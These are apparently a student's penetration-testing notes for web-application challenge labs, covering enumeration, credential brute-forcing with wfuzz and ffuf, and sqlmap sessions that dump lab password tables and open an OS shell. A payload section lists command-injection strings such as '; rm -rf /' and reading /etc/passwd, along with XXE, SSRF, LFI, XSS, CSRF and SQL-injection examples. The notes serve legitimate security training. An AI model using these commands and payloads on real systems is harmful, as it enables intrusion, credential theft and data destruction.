#### Ping
#ping
```bash
┌──(root💀gobots)-[03Dec2024 20:51:32]-[/usr/share/seclists/Fuzzing]
└─# ping bambi            
PING bambi (192.168.118.121) 56(84) bytes of data.
64 bytes from bambi (192.168.118.121): icmp_seq=1 ttl=61 time=41.8 ms
64 bytes from bambi (192.168.118.121): icmp_seq=2 ttl=61 time=39.9 ms
```

-------
#### Nmap
#nmap
```bash
┌──(root💀gobots)-[03Dec2024 20:51:36]-[/usr/share/seclists/Fuzzing]
└─# nmap -Pn -sV bambi -p-          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:52 UTC
Nmap scan report for bambi (192.168.118.121)
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.62 seconds
```
#### Nmap Scripts
- nmap scripts are stored in `/usr/share/nmap/scripts`
- `http-enum` is a good recommended script
```bash
kali@kali:/usr/share/nmap/scripts$ nmap -p80 -- script=http-enum 192.168.61.65
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 15:14 EST
Nmap scan report for offsecwp (192.168.50.101)
Host is up (0.048s latency).

PORT STATE SERVICE
80/tcp open http
http-enum:
/wp-login.php: Possible admin folder
/readme.html: Wordpress version: 2
/: WordPress version: 5.8.1
/wp-includes/images/rss.png: Wordpress version 2.2 found.
/wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
/wp-includes/images/blank.gif: Wordpress version 2.6 found.
/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
/wp-login.php: Wordpress login page.
/wp-admin/upgrade.php: Wordpress login page.
/readme.html: Interesting, a readme.

Nmap done: 1 IP address (1 host up) scanned in 75.87 seconds

kaliakali:/usr/share/nmap/scripts$
```
once we have path we can check the `HTTP Methods` - ie what is allowed 
```bash
kali@kali:/usr/share/nmap/scripts$ nmap -p80 -- script=http-methods -- script-args http-meth
ods.url-path='/wp-includes/' $IP
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 15:18 EST
Nmap scan report for offsecwp (192.168.50.101)
Host is up (0.049s latency).

PORT STATE SERVICE
80/tcp open http
http-methods:
Supported Methods: HEAD GET POST OPTIONS
Path tested: /wp-includes/

Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds

kali@kali:/usr/share/nmap/scripts$
```
now we know it is `word press` can use this script
```bash
kaliakali:/usr/share/nmap/scripts$ nmap -p80 -sV --script=http-wordpress-enum offsecwp
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 15:19 EST
Nmap scan report for offsecwp (192.168.50.101)
Host is up (0.048s latency).

PORT
80/tcp open http
http-wordpress-enum:
Search limited to top 100 themes/plugins
plugins
akismet
_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submi
t/ .
Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds

kaliakali:/usr/share/nmap/scripts$

STATE SERVICE VERSION
Apache httpd 2.4.38 ((Debian))
```

-----------
#### Gobuster
#gobuster
- Make sure to use all wordlists
##### /usr/share/wordlists/dirb/common.txt 
```go
┌──(root💀gobots)-[03Dec2024 20:55:54]-[/usr/share/seclists/Fuzzing]
└─# gobuster dir -u http://bambi -w /usr/share/wordlists/dirb/common.txt                                             
```
##### /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```go
┌──(root💀gobots)-[19Nov2024 19:03:54]-[/home/kali]
└─# gobuster dir -u http://jubula -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
##### /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt   
```go
┌──(root💀gobots)-[09Dec2024 04:10:54]-[/home/kali]                                                                              
└─# gobuster dir -u http://jubula -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt                             
```
##### /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```go
┌──(root💀gobots)-[09Dec2024 04:10:26]-[/usr/…/wordlists/seclists/Discovery/Web-Content]
└─# gobuster dir -u http://jubula -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

##### Course Provided - Generic
```bash
kali@kali :~ $ gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301

Gobuster v3.1.0
by OJ Reeves (aTheColonial) & Christian Mehlmauer (afirefart)

[+] Url:
[+] Method:
[+] Threads:
[+] Wordlist:
[+] Negative Status codes:
[+] User Agent:
[+] Timeout:

2021/11/23 16:19:13 Starting gobuster in directory enumeration mode

(Status: 403) [Size: 273]
(Status: 403) [Size: 273]
(Status: 403) [Size: 273]
(Status: 403) [Size: 273]
(Status: 405) [Size: 42]
```

##### Subdomain Busting!
These subdomains might host:
- Management portals
- APIs
- Development or staging environments
- Other services that may have weaker security.
```bash
kaliakali :~ $ gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30 
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Domain:
[+] Threads:
[+] Timeout:
[+] Wordlist:

2021/11/23 16:27:10 Starting gobuster in DNS enumeration mode
2021/11/23 16:27:12 [-] Unable to validate base domain: megacorpone.com (lookup megacorpone.com on 172.16.133.2:53: no such host)
Found: ns1.megacorpone.com
Found: ns2.megacorpone.com
Found: www2.megacorpone.com
Found: ns3.megacorpone.com
Found: vpn.megacorpone.com
Found: www.megacorpone.com
Found: test.megacorpone.com
Found: mail2.megacorpone.com
Found: mail.megacorpone.com
Found: admin.megacorpone.com
Found: beta.megacorpone.com
Found: support.megacorpone.com
Found: intranet.megacorpone.com
Found: router.megacorpone.com
```
#### Hakrawler
#hakrawler
```bash
echo "http://sumo" | hakrawler -u
```
-----
#### Wfuzz
#wfuzz
```bash
┌──(root💀gobots)-[03Dec2024 21:45:57]-[/home/…/SUT/OSWA/challenge_labs/bambi]                                                   
└─# wfuzz -c -z file,/home/kali/SUT/OSWA/challenge_labs/bambi/passwords.txt --hc 404 -H "Content-Type: application/x-www-form-urlencoded" -d "username=Sam&password=FUZZ" http://bambi/dev/index.php       
000000266:   200        132 L    325 W      4835 Ch     "PHOENIX"                                       
000000265:   200        132 L    325 W      4835 Ch     "FARM"                                          
000000249:   200        132 L    325 W      4835 Ch     "FluffySweetiePie"                              
000000263:   200        132 L    325 W      4835 Ch     "OCTOBER"                                       
000000253:   200        132 L    323 W      4892 Ch     "ANGELES"                                       
000000260:   200        132 L    325 W      4835 Ch     "LEVI"       
```
##### File Discovery

```bash
kali@kali:~$ export URL="http://offsecwp:80/FUZZ"  
kali@kali:~$ echo $URL                        
http://offsecwp:80/FUZZ
```
`wfuzz` example
- where  `-c` to display color output`
- where  `-z` file to specify the input source`
- where `--hc` to avoid non-existent and erroneous responses

After several minutes, our scan will complete, and we'll notice that files were discovered. We also discovered wp-login.php, a file we identified in previous sections with Burp Suite's Intercept and Repeater. Further there are two reasons that we did not discover directories.
```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/FUZZ
Total requests: 17128

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000028:   200        100 L    450 W      6798 Ch     "wp-login.php"
000000001:   301        0 L      0 W        0 Ch        "index.php"         
000000005:   405        0 L      6 W        42 Ch       "xmlrpc.php"        
000000122:   200        97 L     823 W      7345 Ch     "readme.html"        
000000198:   200        384 L    3177 W     19915 Ch    "license.txt"      
000000255:   200        0 L      0 W        0 Ch        "wp-config.php"   
000000289:   200        4 L      15 W       135 Ch      "wp-trackback.php"    
000000369:   500        0 L      0 W        0 Ch        "wp-settings.php"
000000371:   301        0 L      0 W        0 Ch        "."        
000000405:   200        0 L      0 W        0 Ch        "wp-cron.php" 
000000440:   200        0 L      0 W        0 Ch        "wp-blog-header.php"  
000000454:   200        11 L     23 W       221 Ch      "wp-links-opml.php"
000000830:   200        0 L      0 W        0 Ch        "wp-load.php"      
000001065:   302        0 L      0 W        0 Ch        "wp-signup.php"
000001499:   302        0 L      0 W        0 Ch        "wp-activate.php"                                                                                                 
Total time: 0
Processed Requests: 17128
Filtered Requests: 17113
Requests/sec.: 0
```

First, we did not discover directories because we did not apply a trailing forward slash to our environment variable when fuzzing. Secondly, we specified the correct wordlist for `files`, not directories. This means our output shows which files were found in the web root.
##### Directory Discovery

To find directories using Wfuzz, let's re-export our environment variable with a trailing forward slash. We'll also update the list we're using in our Wfuzz command from `raft-medium-files.txt` to `raft-medium-directories.txt`.

```bash
kali@kali:~$ export URL="http://offsecwp:80/FUZZ/"
```

```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403,301 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/FUZZ/
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================
000000013:   200        0 L      0 W        0 Ch        "wp-content"
000000020:   302        0 L      0 W        0 Ch        "wp-admin"  

Total time: 0
Processed Requests: 29990
Filtered Requests: 29987
Requests/sec.: 0
```

Because we specified a trailing forward slash, we received the corresponding directories and response codes present in the web root. We also received a `200 OK` response for `/wp-content` and a `302 FOUND` response for `/wp-admin`.


##### Parameter Discovery
```bash
kali@kali:~$ export URL="http://offsecwp:80/index.php?FUZZ=data"
```

```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/index.php?FUZZ=data
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================
000000031:   200        216 L    3219 W     38443 Ch    "s"
000000051:   200        258 L    3358 W     40363 Ch    "preview"
000001169:   200        4 L      15 W       135 Ch      "tb"           
Total time: 0
Processed Requests: 2588
Filtered Requests: 2585
Requests/sec.: 0
```

##### Fuzzing Parameter Values

In the following examples, we will practice the basics of fuzzing a single parameter value on a target web application. In this scenario, we will be fuzzing the `fpv` parameter with a common username wordlist.

We will use the `/usr/share/seclists/Usernames/cirt-default-usernames.txt` wordlist for our purposes here. In our Kali Linux VM, let's point Wfuzz at the `http://offsecwp:80/index.php?fpv=FUZZ` endpoint.

```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://offsecwp:80/index.php?fpv=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp:80/index.php?fpv=FUZZ
Total requests: 828

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000015:   301        0 L      0 W        0 Ch        "22222222"
000000035:   301        0 L      0 W        0 Ch        "APPLSYSPUB"
000000036:   301        0 L      0 W        0 Ch        "APPS"
000000034:   301        0 L      0 W        0 Ch        "APPLSYS"
000000003:   301        0 L      0 W        0 Ch        "$SRV"
000000038:   301        0 L      0 W        0 Ch        "AQ"
000000007:   301        0 L      0 W        0 Ch        "(created)"
...
```
We quickly notice that there are a lot of `erroneous responses` with our parameter values (specifically the 301 response code). To exclude these erroneous responses from our Wfuzz output, we will also add the `--hc` option with a value of a `301`.
```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp:80/index.php?fpv=FUZZ
Total requests: 828

=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================
000000791:   200        0 L      1 W        12 Ch       "unix"                                   

Total time: 0
Processed Requests: 828
Filtered Requests: 827
Requests/sec.: 0
```

##### Fuzzing POST data

bruteforcing `admin password`
- where `-d` to specifically fuzz the POST data
- where  `--hc` with a value of 404 to avoid erroneous responses


```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php         

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp:80/wp-login.php
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000013:   200        105 L    478 W      7201 Ch     "abc123"
000000012:   200        105 L    478 W      7201 Ch     "baseball"
000000010:   200        105 L    478 W      7201 Ch     "dragon"
000000011:   200        105 L    478 W      7201 Ch     "123123"
000000016:   200        105 L    478 W      7201 Ch     "letmein"
000000003:   200        105 L    478 W      7201 Ch     "12345678"
000000014:   200        105 L    478 W      7201 Ch     "football"
000000001:   200        105 L    478 W      7201 Ch     "123456"
000000007:   200        105 L    478 W      7201 Ch     "1234"
000000015:   200        105 L    478 W      7201 Ch     "monkey"
000000009:   200        105 L    478 W      7201 Ch     "1234567"
000000005:   200        105 L    478 W      7201 Ch     "123456789"
000000006:   200        105 L    478 W      7201 Ch     "12345"
000000008:   200        105 L    478 W      7201 Ch     "111111" 
...
```
The above output shows that we receive several erroneous response sizes. Let's correct this by supplying the `--hh` parameter to suppress the response size value of `7201 bytes`, thus filtering our results so only successful attempts are shown in our output.

```bash
kali@kali:~$ export URL="http://offsecwp:80/wp-login.php"

kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" --hh 7201 "$URL"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://offsecwp/wp-login.php
Total requests: 100000
=====================================================================
ID           Response   Lines    Word       Chars       Payload       
=====================================================================
000000002:   302        0 L      0 W        0 Ch        "password"  
```
#### Ffuf
#ffuf
```bash
┌──(root💀gobots)-[10Nov2024 07:10:04]-[/home/…/SUT/OSWA/challenge_labs/bambi]                                                        
└─# ffuf -w passwords.txt -u http://bambi/dev/index.php -X POST -d 'username=Sam&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'        
```
------
#### Cewl
#cewl
```bash
┌──(root💀gobots)-[03Dec2024 21:19:55]-[/home/…/SUT/OSWA/challenge_labs/bambi]
└─# cewl --write passwords.txt http://bambi
```
------
#### SQLmap
#sqlmap
##### Testing Requests
when finding a `POST` request that is assumed to be vulnerable to `SQL` the first command you would run is this to identify the `SQL` field that is vulnerable as well as what type of `SQL` it is vulnerable to
- **`-r request.txt`**: Points sqlmap to the raw request file.
- **`--batch`**: Automatically answers prompts (useful for automation).
- **`--risk=3`**: Increases the risk level (test more aggressive payloads).
- **`--level=5`**: Increases the level of testing (tests more input points).

if unsure what field to test against - typically takes a very long time, not recommended - faster to test each individual parameter
```sql
sqlmap -r post_req.txt --batch --risk=3 --level=5
```
same but testing individual fields
```bash
┌──(root💀gobots)-[25Nov2024 17:30:01]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                          
└─# sqlmap -r post_request.txt -p username --level=3 --risk=3 --batch       
```
if we want to wipe our progress and start fresh on a new target or retest, we need to run `--flush-session` that would look like this
```sql
sqlmap -r request.txt -p username --batch --risk=3 --level=5 --flush-session
```
now we test to identify the databases with the `--dbs` option, now we have the `dbs` `piano_protocol` we can look for the `tables`
```bash
┌──(root💀gobots)-[25Nov2024 17:13:47]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]                                        
└─# sqlmap -r post_req.txt -p username --dbs --batch      
[04:30:33] [INFO] the back-end DBMS is MySQL       
web server operating system: Linux Debian          
web application technology: Apache 2.4.52, PHP 7.3.33                                                 
back-end DBMS: MySQL >= 5.6                        
[04:30:33] [INFO] fetching database names          
available databases [6]:                           
[*] information_schema                             
[*] mysql                                          
[*] performance_schema                             
[*] piano_protocol                                 
[*] sqli                                           
[*] sys              
```
now we test to find the `--tables` in the `piano_protocol` database
```bash
┌──(root💀gobots)-[10Dec2024 04:30:33]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]               
└─# sqlmap -r post_req.txt -p username -D piano_protocol --tables --batch    
[04:31:16] [INFO] fetching tables for database: 'piano_protocol'                                      
Database: piano_protocol                           
[2 tables]                                         
+------------------+                               
| contact_requests |                               
| users            |                               
+------------------+                               

[04:31:16] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/piano'    
[04:31:16] [WARNING] your sqlmap version is outdated           
```
now we test to find the `--columns` in the `--tables` in the `piano_protocol` database
```bash
┌──(root💀gobots)-[10Dec2024 04:31:16]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]               
└─# sqlmap -r post_req.txt -p username -D piano_protocol -T users --columns --batch
[04:31:49] [INFO] fetching columns for table 'users' in database 'piano_protocol'                     
Database: piano_protocol                           
Table: users                                       
[6 columns]                                        
+-----------+---------------+                      
| Column    | Type          |                      
+-----------+---------------+                      
| email     | varchar(255)  |                      
| firstname | varchar(255)  |                      
| id        | int(11)       |                      
| lastname  | varchar(255)  |                      
| password  | varchar(255)  |                      
| username  | varchar(3000) |                      
+-----------+---------------+           
```
now since we have the `--columns`, `--tables,` & `--dbs` we can now dump the column
- notice at the end the location of where the files are `dumped`
```bash
┌──(root💀gobots)-[10Dec2024 04:31:49]-[/home/…/SUT/OSWA/challenge_labs/piano_protocol]               
└─# sqlmap -r post_req.txt -p username -D piano_protocol -T users -C username,password --dump --batch   
back-end DBMS: MySQL >= 5.6
back-end DBMS: MySQL >= 5.6
[04:51:23] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'piano_protocol'
Database: piano_protocol
Table: users
[1 entry]
+----------+-------------------+
| username | password          |
+----------+-------------------+
| admin    | djj28hah*dhk2hd1% |
+----------+-------------------+
[04:32:09] [INFO] table 'piano_protocol.users' dumped to CSV file '/root/.local/share/sqlmap/output/piano/dump/piano_protocol/users.csv'
[04:32:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/piano'
[04:32:09] [WARNING] your sqlmap version is outdated
```
`sqlmap` command to identify the database - `--batch` to continue on the prompts
```bash
┌──(root💀gobots)-[26Nov2024 17:05:45]-[/home/…/SUT/OSWA/challenge_labs/screamin_firehawk]
└─# sqlmap -r editFlight-req --banner --batch
[17:04:52] [INFO] the back-end DBMS is PostgreSQL
[17:04:52] [INFO] fetching banner
[17:04:52] [INFO] retrieved: 
[16:25:21] [INFO] the back-end DBMS is PostgreSQL
[16:25:21] [INFO] fetching banner
[16:25:21] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                            
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[16:25:30] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[16:25:41] [INFO] adjusting time delay to 1 second due to good response times
PostgreSQL 15.2 (Debian 15.2-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
web server operating system: Linux Debian
web application technology: PHP 7.3.33, Apache 2.4.52

```
now we have the `dbs` time to chase down the `database` names, because now we know the technique is `stacked queries` we can add that technique only to make `sqlmap go faster`
- we now have the `public` database
- different `technique` methods 
- **B**: Boolean-based blind
- **E**: Error-based
- **U**: Union query-based
- **S**: Stacked queries
- **T**: Time-based blind
- **Q**: Inline queries
```bash
sqlmap -r postpost_req.txt --batch --risk=3 --level=5 --dbms=PostgreSQL --dbs
---                                                                                                                                                                                                        
Parameter: MULTIPART passengerCount ((custom) POST)                                                                                        
    Type: stacked queries                                                                                                                                 
    Title: PostgreSQL > 8.1 stacked queries (comment)                                                                                                                                                      
    Payload: ------WebKitFormBoundaryAKOLfA1vBSRnimSp                                                                                                                                                      
Content-Disposition: form-data; name="_token"    

[17:36:33] [INFO] fetching current database
[17:36:33] [INFO] retrieved: public
[17:37:00] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
available databases [1]:
[*] public
```
now we know its `stacked queries` we add the `--technique` to make it faster, and utilizing the `Database` to dump `--tables`
```bash
sqlmap -r postpost_req.txt --technique=S --risk=3 --level=5 --dbms=PostgreSQL -D public --tables --batch
[17:50:25] [INFO] retrieved: users
Database: public
[2 tables]
+---------+
| flights |
| users   |
+---------+
```
once we have the `--tables` we can dump the `--columns`
```bash
sqlmap -r postpost_req.txt --technique=S --risk=3 --level=5 --dbms=PostgreSQL -D public -T users --columns --batch
[17:50:25] [INFO] retrieved: users
Database: public
Table: users
[7 columns]
+-----------+------+
| Column    | Type |
+-----------+------+
| email     | text |
| firstname | text |
| isadmin   | text |
| lastname  | text |
| password  | text |
| user_id   | int4 |
| username  | text |
+-----------+------+
```
now we just dump the `--columns`
```bash
sqlmap -r postpost_req.txt --technique=S --risk=3 --level=5 --dbms=PostgreSQL -D public -T users -C email,firstname,isadmin,lastname,password,user_id,username --dump --batch
Database: public
Table: users
[3 entries]
+-------------------+---------------+---------+---------------+----------------+---------+----------+
| email             | firstname     | isadmin | lastname      | password       | user_id | username |
+-------------------+---------------+---------+---------------+----------------+---------+----------+
| admin@thinc.local | firehawkAdmin | true    | firehawkAdmin | hufeh9h123h4@@ | 1       | admin    |
| testada           | <blank>       | <blank> | <blank>       | <blank>        | <blank> | <blank>  |
| <blank>           | <blank>       | <blank> | <blank>       | <blank>        | <blank> | <blank>  |
+-------------------+---------------+---------+---------------+----------------+---------+----------+
```
we can get a `os-shell` now that we know the exploitable parameter is `passengerCount`
- can up the `v` to `v3` to get actual feedback, `os-shell` is known to take a long time before actually executing your command
- example of getting flag from `screamin' firehawk` using this method
```bash
sqlmap -r postpost_req.txt --batch -v 0 -p passengerCount --os-shell
```
method to `dump` everything
```bash
┌──(root💀gobots)-[18Dec2024 13:29:01]-[/home/…/SUT/OSWA/challenge_labs/solarmedical]                                   
└─# sqlmap -r tstres_req1_day2.txt -p patientName -D MedicalDB -T Users --dump-all --batch 
```

------
#### XSS - Java Script Source Code Review - Admin User Creation
- Ensure to review `SourceCode main.js` of important endpoints - `/admin`, `/login` etc.. 
- Was required in `Mentor` box in conjunction with `XSS`
[[5. web page enum - local.txt]]
-----------
### All Possible Vulnerabilities Description & Examples
#### All Possible Vulnerabilities Description 

##### Credential Fuzzing
 If a `login` field exists, specific words are used around the web page. `Could be clues to Credentials Fuzzing`
##### Local Code Execution
 If there are `parameters` to test in `burpsuite` test them various ways by testing for `; cat /etc/passwd`
##### Remote Code Execution
Same as LCE except `RCE` is when you are able to reach back to `kali` machine such as `curl http://IP/test.txt`
##### Insecure Direct Object Reference (IDOR)
If `unique identifiers` (like user IDs or file IDs) are in the URL or parameters, test if they can be manipulated to access other users' resources.
Example: Change `/profile?id=123` to `/profile?id=124` to see if unauthorized data is exposed.
##### Command Injection
If `user input` is incorporated into system commands without proper sanitization, test if you can execute arbitrary commands on the server.
Example: Inject payloads into input fields or parameters to execute system commands, such as:
`; ls` or `&& ls` to list files in the current directory.
`; cat /etc/passwd` to read sensitive files.
`| whoami` to determine the user context of the application.
Using payloads like `$(id)` or `` `id` `` to execute commands in subshells.
Test using variations of common delimiters (`;`, `&&`, `||`, `|`, `$( )`, `` ` ` ``) depending on the command execution context.

```bash
### Common Special Characters for Command Injection:

1. **Pipe Operators**:
    
    - | (Pipe)
    - || (Logical OR)
2. **Redirection Operators**:
    
    - > (Output redirection)
    - >> (Append redirection)
    - < (Input redirection)
    - &> (Redirect stdout and stderr)
3. **Logical and Control Operators**:
    
    - & (Command separator/background execution)
    - && (Logical AND)
    - ; (Command separator)
4. **Subshell and Command Substitution**:
    
    -  ` ` (Backticks, command substitution)
    - $() (Command substitution)
5. **Wildcard and Globbing Characters**:
    
    - * (Wildcard)
    - ? (Single character wildcard)
    - [] (Character classes)
    - {} (Brace expansion)
6. **Quoting Characters**:
    
    - ' (Single quotes)
    - " (Double quotes)
    - \ (Backslash, escape character)
7. **Variable Expansion**:

    - $ (Variable substitution)
8. **Parentheses and Brackets**:
    
    - () (Grouping commands)
    - [] (Test conditions in some shells)
    - {} (Group commands in some shells)
9. **Other Special Characters**:
    
    - # (Comment in shell scripts)
    - ~ (Home directory expansion)
    - : (Null command or path separator)
    - ^ (Control operators in some shells like PowerShell)
    - % (Variable expansion in Windows CMD)
    - = (Assignment or comparison)
10. **Line Breaks**:
    
    - Newline (`\n` or `%0A`)
    - Carriage return (`\r` or `%0D`)

---

### Examples of Potentially Dangerous Strings:

1. ; rm -rf /
2. | ls -la
3. && echo "Injected"
4. `cat /etc/passwd`
5. $(uname -a)
```
##### Server-Side Request Forgery (SSRF) 
 If `user input` influences server-side HTTP requests, test if you can manipulate it to make requests to unintended locations.
 Example: Change a URL parameter like `url=https://example.com` to `url=http://localhost:8080` or `url=file:///etc/passwd` to see if the server retrieves internal or sensitive resources.
 `url=gopher://127.0.0.1:25/_HELO` to interact with internal services, like sending raw commands to SMTP or Redis.
 In `Glaucidium` was used to create admin user.
##### Server-Side Template Injection (SSTI)
- If `user input` is embedded into templates without proper sanitization or escaping, test if the input can execute malicious template code.
- Example: Inject payloads like `{{7*7}}` or `${7*7}` into input fields or parameters to see if the application renders the output `49`, indicating the vulnerability.
##### Cross-Site Scripting (XSS)
- If `user input` is reflected on a page without proper escaping or sanitization, test if you can inject malicious JavaScript code that will execute in another user's browser.
- Example: Inject a payload like `<script>alert('XSS')</script>` into input fields, URL parameters, or headers, and check if the script runs in the browser, popping up an alert.
- Variations can include testing for:
-  `DOM-based XSS:` Manipulating the Document Object Model (DOM) to execute malicious code.
-  `Reflected XSS:`The server reflects the injected payload back to the browser without sanitization.
-  `Stored XSS:` The payload is saved on the server and executed every time the page is loaded.
##### XML External Entity XXE
- If `user input` is processed as XML and the application does not properly sanitize or configure the XML parser, test if you can inject XML entities that lead to security vulnerabilities.
- Example: Inject a payload like `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <foo>&xxe;</foo>` into XML input fields to attempt to retrieve sensitive files from the server, such as `/etc/passwd`.
##### SQL Injection
- If `user input`is included in an SQL query without proper sanitization or escaping, test if you can manipulate the query to alter its behavior, access unauthorized data, or execute commands on the database.
- Example: Inject a payload like `' OR 1=1 --` into an input field or URL parameter to bypass authentication or access all data from a database.
##### Local File Inclusion (LFI)
- If `user input` is used to specify file paths and the application does not properly sanitize the input, test if you can manipulate it to include local files on the server.
- Example: Inject a payload like `../../../../etc/passwd` into a parameter to try and include sensitive files like `/etc/passwd` on the server.
- LFI can lead to:
- `Remote code execution`: If the included files are executable or contain dangerous code.
- `Information Disclosure`: Exposure of sensitive files on the server.

##### Cross-Site Request Forgery (CSRF)
- If `user input` causes the server to perform actions without proper validation, test if you can trick a user into making an unintended request (usually while they are authenticated).
- Example: Craft a request like `<img src="http://victim.com/change-password?newpassword=evilpassword" />` to force an authenticated user to change their password without their consent, just by loading the image tag in their browser.
- To prevent CSRF, applications should include `anti-CSRF tokens` in forms and validate the `Referer` or `Origin` headers.
- **One area that can be effective to target with CSRF attacks is user creation. If we can trick an `admin user to execute our payload`, we can create new users, potentially with elevated permissions or roles.***
- refer to `screamin_firehawk walkthrough`
#### ALL Possible Vulnerabilities Examples
##### Credential Fuzzing 
###### Bambi
#ffuf #wfuzz
`ffuf` command displays the password that matches the user `Sam:ANGELES`
```bash
┌──(root💀gobots)-[10Nov2024 07:10:04]-[/home/…/SUT/OSWA/challenge_labs/bambi]                                                                       
└─# ffuf -w passwords.txt -u http://bambi/dev/index.php -X POST -d 'username=Sam&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'        
        /'___\  /'___\           /'___\                                                                                             
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                             
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                            
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                            
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                             
          \/_/    \/_/   \/___/    \/_/                                                                                                
       v2.1.0-dev                                                                                                                                                                                          
________________________________________________                                                                                                      
 :: Method           : POST                                                                                                        
 :: URL              : http://bambi/dev/index.php                                                                                   
 :: Wordlist         : FUZZ: /home/kali/SUT/OSWA/challenge_labs/bambi/passwords.txt                                                 
 :: Header           : Content-Type: application/x-www-form-urlencoded                                                              
 :: Data             : username=Sam&password=FUZZ                                                                                   
 :: Follow redirects : false                                                                                                        
 :: Calibration      : false                                                                                                        
 :: Timeout          : 10                                                                                                           
 :: Threads          : 40                                                                                                           
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
About                   [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 54ms]
that                    [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 56ms]
license                 [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 54ms]
Show                    [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 54ms]
Devon                   [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 57ms]
Sam                     [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 59ms]
use                     [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 59ms]
Times                   [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 58ms]
Johnny                  [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 59ms]
the                     [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 65ms]
